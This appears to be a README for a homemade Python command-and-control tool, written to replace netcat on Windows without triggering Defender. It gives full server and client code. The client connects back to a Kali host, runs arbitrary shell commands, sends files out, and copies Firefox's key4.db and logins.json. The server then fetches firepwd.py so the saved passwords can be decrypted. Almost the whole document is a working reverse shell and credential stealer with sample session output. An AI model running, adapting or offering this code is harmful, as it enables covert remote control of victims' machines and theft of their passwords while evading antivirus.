## Usage

A script created to replace netcat in a windows machine, so we don't trigger the Defender.  
In the windows machine, run the client `python3 cco_c.py` and in kali the server `cco_s.py`  
This command and control not only allows you to run windows commands like `whoami` but also, some custom ones
- **download \<file>** : to download a file from the remote windows machine
- **pwd** : to show the current directory
- **list users**: to list all the users
- **get firefox** to get firefox cached passwords
- And I will be implementing new ones (like uploading)

```python
$: python3 cco_s.py
[+] Listening for incomming connections...
[+] Connection established by ('192.168.1.134', 49920)

>> dir
 El volumen de la unidad C no tiene etiqueta.
 El n√∫mero de serie del volumen es: F0E0-7D03
 Directorio de C:\Users\jessica\Desktop
12/21/2023  10:52 AM    <DIR>          .
12/21/2023  10:52 AM    <DIR>          ..
12/26/2023  11:08 AM                16 hola_mundo.txt

>> download hola_mundo.txt
Downloaded [hola_mundo.txt]: 16b
```


-------------------------------

## Server

File `cco_s.py`

```python
import socket, sys, time, signal, base64, requests
from termcolor import colored as col

######### GLOBALS #################
srv_ip, port = '0.0.0.0', 666
###################################

def def_handler(sig, frame):
    print(col("[*] Saliendo...","yellow")); srv.close(); sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def run_cmd(cmd, conn):
    conn.send(cmd.encode()); output = conn.recv(2048).decode()
    return output

def download(file_name, conn):
    print(col(f"\t> Downloading {file_name}", "yellow")); content = b""
    while (chunk := conn.recv(1024)):
        if b"FIN" in chunk:
            content += chunk
            break
        content += chunk
    content = content.decode(); content = content.replace("FIN", "") if "FIN" in content else content
    file_title = file_name.split('\\')[-1]
    with open(file_title, "wb") as output_file:
        output_file.write(base64.b64decode(content))
    print(col(f"\t> Downloaded [{file_title}]", "yellow"));

def parse_file(current_dir, file_name, conn):
    file_name = file_name if 'C:' in file_name else current_dir + "\\" + file_name
    conn.send(f"download {file_name}".encode()); download(file_name, conn)

def get_firefox(conn):
    conn.send("get firefox".encode()); download("key4.db", conn); download("logins.json", conn)
    response = requests.get("https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py")
    with open("firepwd.py", "w", encoding="utf-8") as local_file:
        local_file.write(response.text)
    print(col(f"\t> Run now 'python3 firepwd.py' to decrypt passwords", "yellow"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((srv_ip, port)); srv.listen(); print(col(f"\n[+] Listening for incomming connections...", "yellow"))
    conn, addr = srv.accept(); print(col(f"\n[+] Connection established by {addr}", "yellow"))
    current_dir = run_cmd("echo %cd%", conn).strip(); print(col(f"\n[+] Console on {current_dir}", "yellow"))
    while True:
        cmd = input(col(">> ", "yellow"));
        if cmd == "list users":
            cmd = "net user"; print(run_cmd(cmd, conn));
        elif cmd == "exit":
            srv.close(); sys.exit(0)
        elif cmd == "pwd":
            print(current_dir)
        elif "download" in cmd:
            file_name = cmd.replace("download ", ""); parse_file(current_dir, file_name, conn);
        elif cmd == "get firefox":
            get_firefox(conn)
        else:
            print(run_cmd(cmd, conn))  
```
------------------------------

## Client

File `cco_c.py`

```python
import socket, subprocess, sys, os, base64, time

######### GLOBALS #################
kali_ip, port = '192.168.1.141', 666
###################################

username =  os.popen('whoami').read().split('\\')[1].strip()
run_cmd = lambda cmd: subprocess.check_output(cmd, shell=True).decode('cp850')

def sendfile(filename, s):
    with open(filename, "rb") as binary_file:
        base64_data = base64.b64encode(binary_file.read())
    chunk_size = 1024; chunks = [base64_data[i:i + chunk_size] for i in range(0, len(base64_data), chunk_size)]
    for chunk in chunks:
        s.send(chunk)
    s.send(b"FIN")

def get_firefox(s):
    base_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    profiles = [profile for profile in os.listdir(base_dir) if "release" in profile]
    profile = profiles[0]; file_dir = base_dir + "\\" + profile; 
    sendfile(f"{file_dir}\\key4.db", s); time.sleep(2); sendfile(f"{file_dir}\\logins.json", s)  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((kali_ip, port)); 
    while True:
        cmd = s.recv(1024).decode().strip();
        if "download" in cmd:
            try:
                file_name = cmd.replace("download ", ""); sendfile(file_name, s)
            except Exception as e:
                print(e)
        elif cmd == "get firefox":
            try:
                get_firefox(s)          
            except Exception as e:
                print(e)  
        else:
            try:
                output = run_cmd(cmd); time.sleep(3); s.send(output.encode() + b"\n")
            except subprocess.CalledProcessError as e: 
                s.send(str(e).encode() + b"\n")
            except ConnectionAbortedError:
                sys.exit(0)
```

------------------------------

